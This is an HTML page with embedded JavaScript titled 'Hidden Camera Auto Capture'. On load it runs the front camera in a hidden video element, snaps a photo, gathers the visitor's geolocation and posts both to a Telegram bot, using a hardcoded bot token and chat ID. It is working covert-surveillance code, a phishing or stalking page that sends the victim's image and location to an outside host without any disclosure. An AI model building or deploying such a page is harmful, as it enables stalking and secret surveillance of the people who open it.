<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hidden Camera Auto Capture</title>
</head>
<body>
  <p id="status">Starting capture...</p>

  <script>
    const botToken = '8110393453:AAFWhP0vFwSJobp5GhEe7XjzKiRoorMyg4Y'; // Replace with your bot token
    const chatId = '-4967067213';              // Replace with your chat ID

    async function startCapture() {
      try {
        // Start the front camera without showing video
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.style.display = 'none'; // Hides the video element
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();

        // Wait 2 seconds to stabilize the camera
        await delay(2000);

        // Capture image
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));

        // Get location
        let locationText = 'Location not available';
        try {
          const location = await getLocation();
          locationText = `Latitude: ${location.lat}, Longitude: ${location.lon}`;
        } catch (e) {
          console.error('Location error:', e);
        }

        // Send to Telegram
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob);
        formData.append('caption', locationText);

        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData,
        });

        const data = await response.json();
        if (data.ok) {
          document.getElementById('status').innerText = 'Sent to Telegram successfully!';
        } else {
          console.error('Telegram API error:', data);
          document.getElementById('status').innerText = 'Telegram error: ' + data.description;
        }

        // Stop the camera stream
        stream.getTracks().forEach(track => track.stop());

      } catch (error) {
        console.error('Capture error:', error);
        document.getElementById('status').innerText = 'Error: ' + error.message;
      }
    }

    function getLocation() {
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          reject
        );
      });
    }

    function delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Auto start on page load
    startCapture();
  </script>
</body>
</html>
